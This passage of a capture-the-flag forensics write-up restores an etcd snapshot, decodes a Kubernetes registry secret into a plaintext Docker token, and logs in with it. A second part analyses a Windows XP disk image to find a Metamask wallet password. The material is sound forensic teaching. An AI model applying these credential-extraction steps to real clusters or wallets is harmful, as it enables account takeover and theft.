<code>/etc/kubernetes/manifests/api-server.yaml</code>  to add these lines.</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">annotations:</span></span><br><span class=\"line\">    <span class=\"attr\">kubeadm.kubernetes.io/kube-apiserver.advertise-address.endpoint:</span> <span class=\"number\">172.18</span><span class=\"number\">.0</span><span class=\"number\">.2</span><span class=\"string\">:6443</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  <span class=\"attr\">labels:</span></span><br><span class=\"line\">    <span class=\"attr\">component:</span> <span class=\"string\">kube-apiserver</span></span><br><span class=\"line\">    <span class=\"attr\">tier:</span> <span class=\"string\">control-plane</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">kube-apiserver</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">kube-system</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">containers:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">command:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">kube-apiserver</span></span><br><span class=\"line\">    <span class=\"string\">...</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">--encryption-provider-config=/etc/kubernetes/enc/enc.yaml</span>  <span class=\"comment\"># &lt;-- add this line</span></span><br><span class=\"line\">    <span class=\"attr\">volumeMounts:</span></span><br><span class=\"line\">    <span class=\"string\">...</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">enc</span>                           <span class=\"comment\"># &lt;-- add this line</span></span><br><span class=\"line\">      <span class=\"attr\">mountPath:</span> <span class=\"string\">/etc/kubernetes/enc</span>      <span class=\"comment\"># &lt;-- add this line</span></span><br><span class=\"line\">      <span class=\"attr\">readonly:</span> <span class=\"literal\">true</span>                      <span class=\"comment\"># &lt;-- add this line</span></span><br><span class=\"line\">    <span class=\"string\">...</span></span><br><span class=\"line\">  <span class=\"attr\">volumes:</span></span><br><span class=\"line\">  <span class=\"string\">...</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">enc</span>                             <span class=\"comment\"># &lt;-- add this line</span></span><br><span class=\"line\">    <span class=\"attr\">hostPath:</span>                             <span class=\"comment\"># &lt;-- add this line</span></span><br><span class=\"line\">      <span class=\"attr\">path:</span> <span class=\"string\">/etc/kubernetes/enc</span>           <span class=\"comment\"># &lt;-- add this line</span></span><br><span class=\"line\">      <span class=\"attr\">type:</span> <span class=\"string\">DirectoryOrCreate</span>             <span class=\"comment\"># &lt;-- add this line</span></span><br><span class=\"line\">  <span class=\"string\">...</span></span><br></pre></td></tr></table></figure>\n<p>After changing the manifest the api-server will be stopped and down. If you did it corretly, you need to wait a few seconds until the api-server works again!</p>\n<p>After configuring the api-server correctly let’s take the content  <code>/var/lib/netcd</code>  and try to use the  <code>db</code>  as our snapshot that we want to restore it!</p>\n<p><img data-src=\"https://i.imgur.com/fu0HEsS.png\" alt=\"\"></p>\n<p>I suggest to copy  <code>db</code>  inside the control-plane node (in this case container). I will copy it to one of the extraMounts of kind.</p>\n<p>Now let’s open a shell inside the control-plane container:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it kind-control-plane bash</span><br></pre></td></tr></table></figure>\n<p>Now we need to use an utility called etcdctl that will help us to interact with the etcd server.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt update </span><br><span class=\"line\">apt install etcd-client</span><br></pre></td></tr></table></figure>\n<p>After install it succesfully. An important thing it must be done. Don’t skip this step! you must export an env variable to make etcdctl behave as we need!</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> ETCDTL_API=3</span><br></pre></td></tr></table></figure>\n<p>now it’s time to use this utility! There is a resotre command in this utility that allow us to restore the backup or the snapshot</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">etcdctl --endpoints=https://[etcd-server] \\</span><br><span class=\"line\">--cacert=&lt;path-to-ca-certification&gt; \\</span><br><span class=\"line\">--cert=&lt;path-to-etcd-server-cert&gt; \\</span><br><span class=\"line\">--key=&lt;path-to-etcd-server-key&gt; \\</span><br><span class=\"line\">--data-dir &lt;path-to-restored-data&gt; \\ </span><br><span class=\"line\">snapshot restore &lt;path-to-snapshot&gt;</span><br></pre></td></tr></table></figure>\n<p>You need to fill this arguments with your own. you can get theses information from  <code>/etc/kubernetes/manifests/etcd.yaml</code></p>\n<p>In my case the command it will be like this:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ETCDTL_API=3 etcdctl --endpoints=https://[127.0.0.1:2379] \\</span><br><span class=\"line\">--cacert=/etc/kubernetes/pki/etcd/ca.crt \\</span><br><span class=\"line\">--cert=/etc/kubernetes/pki/etcd/server.crt \\</span><br><span class=\"line\">--key=/etc/kubernetes/pki/etcd/server.key \\</span><br><span class=\"line\">--data-dir /var/lib/etcd-backup \\</span><br><span class=\"line\">snapshot restore ./db</span><br></pre></td></tr></table></figure>\n<p>You migth get an error or warning about hash stuff after running this command. Skip it! Let’s check if  <code>/var/lib/etcd-backup</code>  directory is created and if it contains  <code>member</code>  directory!</p>\n<p>If you got it! Then you are on the right way! Now it’s time to do the crazy thing! Let’s replace our new data placed in  <code>/var/lib/etcd-backup/member/snap</code>  to the original etcd database!</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cp</span> /var/lib/etcd-backup/member/snap/db /var/lib/etcd/member/snap/</span><br></pre></td></tr></table></figure>\n<p>Just wait few seconds! and try a kubectl command!</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl get nodes</span><br><span class=\"line\">NAME                  STATUS     ROLES           AGE   VERSION</span><br><span class=\"line\">kind-control-plane    NotReady   &lt;none&gt;          51m   v1.25.3</span><br><span class=\"line\">kind-worker           NotReady   &lt;none&gt;          51m   v1.25.3</span><br><span class=\"line\">quals-control-plane   Ready      control-plane   26h   v1.25.3</span><br><span class=\"line\">quals-worker          Ready      &lt;none&gt;          26h   v1.25.3</span><br></pre></td></tr></table></figure>\n<p>Bingo! It works fine! but as you see here we have nodes naming issues cause of the data of the etcd!</p>\n<p>Let’s check if we have a secret object or not!</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl get secrets</span><br><span class=\"line\">NAME      TYPE                             DATA   AGE</span><br><span class=\"line\">regcred   kubernetes.io/dockerconfigjson   1      26h</span><br></pre></td></tr></table></figure>\n<p>And Yes!!! We got our secret! Let’s now inspect the data inside it!</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> kubectl get secret regcred -o jsonpath=<span class=\"string\">&#x27;&#123;.data.\\.dockerconfigjson&#125;&#x27;</span> | <span class=\"built_in\">base64</span> -d</span><br><span class=\"line\">&#123;<span class=\"string\">&quot;auths&quot;</span>:&#123;<span class=\"string\">&quot;docker.io&quot;</span>:&#123;<span class=\"string\">&quot;username&quot;</span>:<span class=\"string\">&quot;medrafk8s&quot;</span>,<span class=\"string\">&quot;password&quot;</span>:<span class=\"string\">&quot;dckr_pat_MLkRjYtjdk7dwT80W_dx3VTuac8&quot;</span>,<span class=\"string\">&quot;auth&quot;</span>:<span class=\"string\">&quot;bWVkcmFmazhzOmRja3JfcGF0X01Ma1JqWXRqZGs3ZHdUODBXX2R4M1ZUdWFjOA==&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>And finally! The registry is  <code>docker.io</code> , the username is  <code>medrafk8s</code>  and the password is  <code>dckr_pat_MLkRjYtjdk7dwT80W_dx3VTuac8</code></p>\n<p>With this creds we can pull the container that host the malicious binary and analyse his traffic! Let’s do it!</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ docker login docker.io -u medrafk8s -p dckr_pat_MLkRjYtjdk7dwT80W_dx3VTuac8</span><br><span class=\"line\">WARNING! Using --password via the CLI is insecure. Use --password-stdin.</span><br><span class=\"line\">Login Succeeded</span><br></pre></td></tr></table></figure>\n<p>Let’s pull this image now!</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ docker pull medrafk8s/kubersex</span><br><span class=\"line\">Using default tag: latest</span><br><span class=\"line\">latest: Pulling from medrafk8s/kubersex</span><br><span class=\"line\">c158987b0551: Pull complete</span><br><span class=\"line\">1e35f6679fab: Pull complete</span><br><span class=\"line\">cb9626c74200: Pull complete</span><br><span class=\"line\">b6334b6ace34: Pull complete</span><br><span class=\"line\">f1d1c9928c82: Pull complete</span><br><span class=\"line\">9b6f639ec6ea: Pull complete</span><br><span class=\"line\">ee68d3549ec8: Downloading [=======&gt;                                           ]  1.813MB/11.49MB</span><br><span class=\"line\">4caa31e6cbc5: Download complete</span><br><span class=\"line\">a1434f597582: Waiting</span><br></pre></td></tr></table></figure>\n<p>The 1st i used to do when I pull a container image in forensics challenges is to check the layers of the image!</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ docker <span class=\"built_in\">history</span> medrafk8s/kubersex</span><br><span class=\"line\">IMAGE          CREATED          CREATED BY                                      SIZE      COMMENT</span><br><span class=\"line\">77a3b3f4c35c   13 minutes ago   /bin/sh -c <span class=\"comment\">#(nop)  CMD [&quot;nginx&quot; &quot;-g&quot; &quot;daemon…   0B</span></span><br><span class=\"line\">0b383b70426b   13 minutes ago   /bin/sh -c <span class=\"built_in\">rm</span> Serial-Key.txt                    0B</span><br><span class=\"line\">b6ca15406c7d   13 minutes ago   /bin/sh -c <span class=\"comment\">#(nop)  EXPOSE 80                    0B</span></span><br><span class=\"line\">64eaf6945cd1   13 minutes ago   /bin/sh -c <span class=\"comment\">#(nop) COPY file:ed75fc1a725ff91b…   20B</span></span><br><span class=\"line\">748d1b219207   13 minutes ago   /bin/sh -c <span class=\"comment\">#(nop) COPY dir:48e5409ee398a470a…   5.4MB</span></span><br><span class=\"line\">4937520ae206   6 weeks ago      /bin/sh -c <span class=\"built_in\">set</span> -x     &amp;&amp; apkArch=<span class=\"string\">&quot;<span class=\"subst\">$(cat /etc…   29.6MB</span></span></span><br><span class=\"line\"><span class=\"subst\"><span class=\"string\">&lt;missing&gt;      6 weeks ago      /bin/sh -c #(nop)</span>  ENV NJS_VERSION=0.7.12       0B</span></span><br><span class=\"line\"><span class=\"string\">&lt;missing&gt;      6 weeks ago      /bin/sh -c #(nop)  CMD [&quot;</span>nginx<span class=\"string\">&quot; &quot;</span>-g<span class=\"string\">&quot; &quot;</span>daemon…   0B</span><br><span class=\"line\">&lt;missing&gt;      6 weeks ago      /bin/sh -c <span class=\"comment\">#(nop)  STOPSIGNAL SIGQUIT           0B</span></span><br><span class=\"line\">&lt;missing&gt;      6 weeks ago      /bin/sh -c <span class=\"comment\">#(nop)  EXPOSE 80                    0B</span></span><br><span class=\"line\">&lt;missing&gt;      6 weeks ago      /bin/sh -c <span class=\"comment\">#(nop)  ENTRYPOINT [&quot;/docker-entr…   0B</span></span><br><span class=\"line\">&lt;missing&gt;      6 weeks ago      /bin/sh -c <span class=\"comment\">#(nop) COPY file:e57eef017a414ca7…   4.62kB</span></span><br><span class=\"line\">&lt;missing&gt;      6 weeks ago      /bin/sh -c <span class=\"comment\">#(nop) COPY file:36429cfeeb299f99…   3.01kB</span></span><br><span class=\"line\">&lt;missing&gt;      6 weeks ago      /bin/sh -c <span class=\"comment\">#(nop) COPY file:d4375883ed5db364…   276B</span></span><br><span class=\"line\">&lt;missing&gt;      6 weeks ago      /bin/sh -c <span class=\"comment\">#(nop) COPY file:5c18272734349488…   2.12kB</span></span><br><span class=\"line\">&lt;missing&gt;      6 weeks ago      /bin/sh -c <span class=\"comment\">#(nop) COPY file:7b307b62e82255f0…   1.62kB</span></span><br><span class=\"line\">&lt;missing&gt;      6 weeks ago      /bin/sh -c <span class=\"built_in\">set</span> -x     &amp;&amp; addgroup -g 101 -S …   4.74MB</span><br><span class=\"line\">&lt;missing&gt;      6 weeks ago      /bin/sh -c <span class=\"comment\">#(nop)  ENV PKG_RELEASE=1            0B</span></span><br><span class=\"line\">&lt;missing&gt;      6 weeks ago      /bin/sh -c <span class=\"comment\">#(nop)  ENV NGINX_VERSION=1.25.1     0B</span></span><br><span class=\"line\">&lt;missing&gt;      6 weeks ago      /bin/sh -c <span class=\"comment\">#(nop)  LABEL maintainer=NGINX Do…   0B</span></span><br><span class=\"line\">&lt;missing&gt;      6 weeks ago      /bin/sh -c <span class=\"comment\">#(nop)  CMD [&quot;/bin/sh&quot;]              0B</span></span><br><span class=\"line\">&lt;missing&gt;      6 weeks ago      /bin/sh -c <span class=\"comment\">#(nop) ADD file:828b07e74c184e7f2…   7.05MB</span></span><br></pre></td></tr></table></figure>\n<p>This is a webserver! Something important is here. No one can ignore the  <code>Serial-Key.txt</code>  file<br>\nWe will get it later! Let’s run the web app now</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ sudo docker run --name kubersex -p 81:80 medrafk8s/kubersex</span><br><span class=\"line\">/docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration</span><br><span class=\"line\">/docker-entrypoint.sh: Looking <span class=\"keyword\">for</span> shell scripts <span class=\"keyword\">in</span> /docker-entrypoint.d/</span><br><span class=\"line\">/docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh</span><br><span class=\"line\">10-listen-on-ipv6-by-default.sh: info: Getting the checksum of /etc/nginx/conf.d/default.conf</span><br><span class=\"line\">10-listen-on-ipv6-by-default.sh: info: Enabled listen on IPv6 <span class=\"keyword\">in</span> /etc/nginx/conf.d/default.conf</span><br><span class=\"line\">/docker-entrypoint.sh: Sourcing /docker-entrypoint.d/15-local-resolvers.envsh</span><br><span class=\"line\">/docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh</span><br><span class=\"line\">/docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh</span><br><span class=\"line\">/docker-entrypoint.sh: Configuration complete; ready <span class=\"keyword\">for</span> start up</span><br><span class=\"line\">2023/08/02 17:37:52 [notice] 1<span class=\"comment\">#1: using the &quot;epoll&quot; event method</span></span><br><span class=\"line\">2023/08/02 17:37:52 [notice] 1<span class=\"comment\">#1: nginx/1.25.1</span></span><br><span class=\"line\">2023/08/02 17:37:52 [notice] 1<span class=\"comment\">#1: built by gcc 12.2.1 20220924 (Alpine 12.2.1_git20220924-r4)</span></span><br></pre></td></tr></table></figure>\n<p>Mmm there is a Download button! Press it and you will get a binary! Bingo! This is the malicious release!</p>\n<p><img data-src=\"https://i.imgur.com/jDkGJef.png\" alt=\"The web app\"></p>\n<p>After checking the binary and run it, we found that the binary requires a serial key! Let’s recover that file!</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ docker save medrafk8s/medraf &gt; image.tar </span><br><span class=\"line\">raf@4n6nk8s:~$ tar -xf image.tar </span><br><span class=\"line\">raf@4n6nk8s:~$ <span class=\"built_in\">cd</span> aae4861ba6bde0fbe820ba547bbe794c7c7e9c8be14c8972a6691eaa584161bc</span><br><span class=\"line\">raf@4n6nk8s:~$ tar -xf layer.tar &amp;&amp; <span class=\"built_in\">ls</span></span><br><span class=\"line\">Serial-Key.txt  VERSION  json  layer.tar</span><br></pre></td></tr></table></figure>\n<p>And this is the content of the file !</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">I will put the serial key in the container image in case you forget! YOU FOOOOL YOU USED TO FORGET IT! GO AND DESTROY THE SERVICE WITH THE BOSS HOST!</span><br><span class=\"line\"></span><br><span class=\"line\">KEY:</span><br><span class=\"line\">KFTV-RCFL-VC5W-HX3X</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>At this point you can reverse the binary and get the flag! or patch the binary to change a IP server with your choice! In this step reversing is the main idea so i put a public IP of a reachable server to make the binary send packets when players decice to run it !</p>\n</blockquote>\n<p>Let’s continue:</p>\n<p>Run the binary again and insert that key! It seems the binary works! I bet this is the responsible binary for the DDoS attack! So, I will check the behavior of this binary and open Wireshark while this one is running!</p>\n<p><img data-src=\"https://i.imgur.com/Opesxe5.png\" alt=\"Record Traffic with Wireshark\"></p>\n<p>Mmmm this is http flow! Let’s check the requests!</p>\n<p><img data-src=\"https://i.imgur.com/tzWSbjW.png\" alt=\"We got the flag!\"></p>\n<p>Binggo we got the flag! The flag is on the http header</p>\n<p>FLAG:  <code>Securinets&#123;c03cefb79791e431011d0f86de9dd83aee67aebcec946bfefad00cd4807fc9c3&#125;</code></p>\n<h2 id=\"jackpot\"><a class=\"markdownIt-Anchor\" href=\"#jackpot\">#</a> Jackpot</h2>\n<p><img data-src=\"https://i.imgur.com/GONLlyG.png\" alt=\"\"></p>\n<p>We were able to find a left-behind cranky old cartel laptop in hibernation state. We believe that this device can help us retrieve the cartel’s crypto-currency wallet and withdraw their future gains.</p>\n<p>We know that the cartel uses an intranet to communicate their news within couple of blocks in the city undergrounds.</p>\n<p>Provided this intellisense, can you win us the jackpot? Wrap your finding in Securinets as indicated below.</p>\n<p drug-enforcement-administration-for-the-win-style=\"\">Flag format: Securinets</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9hZG1pZGEwdWk=\">adm &amp; mida0ui</span></p>\n<h3 id=\"attachment\"><a class=\"markdownIt-Anchor\" href=\"#attachment\">#</a> Attachment</h3>\n<p>Given a disk image,  <code>disk.img</code> . The disk image is a raw disk image, and can be investigated using FTK Imager.<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xU3M0UVRRaTRYYlJYYlRmeTNGVTBuRGJxZVBGaHVSRkkvdmlldz91c3A9c2hhcmluZw==\">https://drive.google.com/file/d/1Ss4QTQi4XbRXbTfy3FU0nDbqePFhuRFI/view?usp=sharing</span></p>\n<h3 id=\"writeup\"><a class=\"markdownIt-Anchor\" href=\"#writeup\">#</a> Writeup</h3>\n<p>The disk image is a raw disk image, and can be investigated using FTK Imager. The disk image contains a single partition, which is a Windows XP installation.</p>\n<p>Looking at the root of the disk image, we can see a few interesting files:</p>\n<p><img data-src=\"https://i.imgur.com/Qx1z5zy.png\" alt=\"\"></p>\n<ul>\n<li><code>Documents and Settings</code>  - Contains the user profiles of the system</li>\n<li><code>Program Files</code>  - Contains the installed programs</li>\n<li><code>Windows</code>  - Contains the Windows installation files</li>\n<li><code>pagefile.sys</code>  - The page file of the system, aka swap file, which holds the memory of the system when it is not in use or when it is not enough RAM to hold the memory of the system.</li>\n<li><code>hiberfil.sys</code>  - The hibernation file of the system, which contains the memory of the system when it is hibernated.</li>\n<li><code>System Volume Information</code>  - Contains the shadow copies of the system, which is a backup of the system files. It is used to restore the system in case of a system failure. It is also used by the Windows Backup utility to create a backup of the system. It is also used by the Windows Restore utility to restore the system to a previous state. This folder is present in all disk images, people are usually not interested in it. However, it is very interesting in this case, as it contains a folder named  <code>_restore&#123;xxxxxx&#125;</code> . This folder contains a file named  <code>RPx</code> , this cleary a restore point of the system. We will investigate it later as well.</li>\n</ul>\n<p>and the rest of the stuff that would really find in any Windows disk…</p>\n<p>Let’s start with the fact that the laptop was in hibernation mode, we know for a fact that the hiberfil.sys stores the memory content at hibernation, maybe we can treat it as an actual memory and find the intranet chat!!?</p>\n<p>Googling a bit, I found this (Superuser question)[<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdXBlcnVzZXIuY29tL3F1ZXN0aW9ucy82NjA2NDkvaG93LXRvLXJlYWQtd2luZG93cy1oaWJlcm5hdGlvbi1maWxlLWhpYmVyZmlsLXN5cy10by1leHRyYWN0LWRhdGE=\">https://superuser.com/questions/660649/how-to-read-windows-hibernation-file-hiberfil-sys-to-extract-data</span>] and it says that if we convert the hiberfile.sys file to a raw image, we can use Volatility to analyze it!</p>\n<p>and this is the command to use, as indicated:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol -f hiberfil.sys --profile WinXPSP3x86 imagecopy -O hiberfil.raw</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://i.imgur.com/AgJlPlG.png\" alt=\"\"></p>\n<p>Cool, we hope now we can use Volatility to analyze the hiberfil.raw file. Let’s start by checking the processes and commands history.</p>\n<p><img data-src=\"https://i.imgur.com/MGjHNpu.png\" alt=\"\"></p>\n<p>Cmdscan now maybe!</p>\n<p><img data-src=\"https://i.imgur.com/8KCPq36.png\" alt=\"\"></p>\n<p>There we go, we can see what they meant by the legacy, old school chat. They were using  <code>msg.exe</code>  to communicate with each other. This is a very old program, and it is used to send messages to other users in the same network. It is very similar to the LAN messenger that we found earlier, but it is a command line program.  <code>msg</code>  can also be used to transmit files as well.</p>\n<p>The chat goes with the description and indicates that our guy got some kind of password that was placed in a certain registry key and permanetly deleted it after.</p>\n<p>Now, let’s further investigate the programs now to build an understanding around this situation</p>\n<p><img data-src=\"https://i.imgur.com/NGRW8VU.png\" alt=\"\"></p>\n<p>We only see Chrome to be the only interesting thing in this disk evidence.</p>\n<p>We know the crypto-currency part might need some searching to know that Metamask the most famous crypto wallet is a browser extension!!</p>\n<p>And yeah, Metamask is being used in Chrome. Metamask is a browser extension that allows you to use Ethereum, Binance Chain, and more. It is a very popular extension, and it is used by a lot of people. Metamask gives you a wallet address, and you can use it to send and receive cryptocurrencies whether in the Ethereum network, BSC network, or custom networks. But an address is only the public key you use to send and receive, we are looking further than that, we want the private one to be able to control the wallet completely.</p>\n<p>Metamask Extension for Chrome</p>\n<p><img data-src=\"https://i.imgur.com/wWzkTjZ.png\" alt=\"\"></p>\n<p>Could there be an active wallet within Metamask? Let’s check it out.</p>\n<p>Usually the extension data is stored within the ‘Local Extension Settings’ folder. And as expected, that folder contains some interesting files.</p>\n<p><img data-src=\"https://i.imgur.com/t8T8lYY.png\" alt=\"\"></p>\n<p>The  <code>Local Extension Settings</code>  folder contains a folder named  <code>nkbihfbeogaeaoehlefnkodbefgpgknn</code> , which is the ID of the Metamask extension. This folder contains a file named 0000xx.ldb, which is a DB file. Let’s check it out.</p>\n<p>According to this <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ldGhlcmV1bS5zdGFja2V4Y2hhbmdlLmNvbS9xdWVzdGlvbnMvNTI2NTgvd2hlcmUtZG9lcy1tZXRhbWFzay1zdG9yZS10aGUtd2FsbGV0LXNlZWQtZmlsZS1wYXRo\">Ethereum Stackexchange question</span>. We could be able to completely control the existing wallet if we have the password. Could the challenge be all about that? and how to get the wallet password?</p>\n<p>Yes it is possible, and we will get back to it later, for now, finding password is the priority!! We know it is a registry key, that was deleted.</p>\n<p>Let’s think how we can RESTORE it xD</p>\n<p>Is it the time, to investigate the  <code>_restore&#123;xxxxxx&#125;</code>  folder? right?</p>\n<p>We can make use of a VM, however (OP: says the disk must not be converted back to vmdk whether by using a different file format or breaking the boot files). This way we can’t use a VM to check the restore point. So, we have to do it manually. My idea is to spin my own Windows XP on VMware, you can get the ISO officially by Microsoft with serial number from the WayBackMachine SP3 and x86 of course. After that we create a dummy restore point and modify its files by copying the RP folders from  <code>System Volume Information</code>  and then we can proceed to perform a restore point to see what is inside. I hope you can understand what I mean here.</p>\n<p>(OP Note: for order I guess I will accept any provided order or make the user follow the order as shown in the leaked chat.)</p>\n<p>Let’s do it.</p>\n<ul>\n<li>Spinning a new Windows XP machine</li>\n</ul>\n<p><img data-src=\"https://i.imgur.com/gAJWn0m.png\" alt=\"\"></p>\n<ul>\n<li>Creating a dummy restore point or just get the disk UUID, anyways we need Windows to create a restore point folder for us, so let’s do it.</li>\n</ul>\n<p><img data-src=\"https://i.imgur.com/hoZj5DU.png\" alt=\"\"></p>\n<ul>\n<li>Copying the RP folders from the Disk image  <code>System Volume Information</code>  to the new VM’s  <code>System Volume Information</code></li>\n</ul>\n<p>Export the restore folder from System Volume Information to your desktop or some folder.</p>\n<p>Adjust these folder options on Windows XP VM</p>\n<p><img data-src=\"https://i.imgur.com/LH8W47T.png\" alt=\"\"></p>\n<p>Then use this command to gain access to the System Volume Information folder</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cacls <span class=\"string\">&quot;C:\\System Volume Information&quot;</span> /E /G Administrator:F</span><br></pre></td></tr></table></figure>\n<p>It can be administrator, Everyone or your specific VM username.</p>\n<p><img data-src=\"https://i.imgur.com/6JWtrGQ.png\" alt=\"\"></p>\n<p>Then copy the restore folder contents to the System Volume Information folder</p>\n<p>This is the current dummy restore point we made</p>\n<p><img data-src=\"https://i.imgur.com/ReEeaE9.png\" alt=\"\"></p>\n<p>We add the exported RP5 and RP6 folders from the disk image with them</p>\n<p>In each of the folders there is a  <code>drivetable.txt</code>  file that contains the old disk UUID, we need to replace it with the new 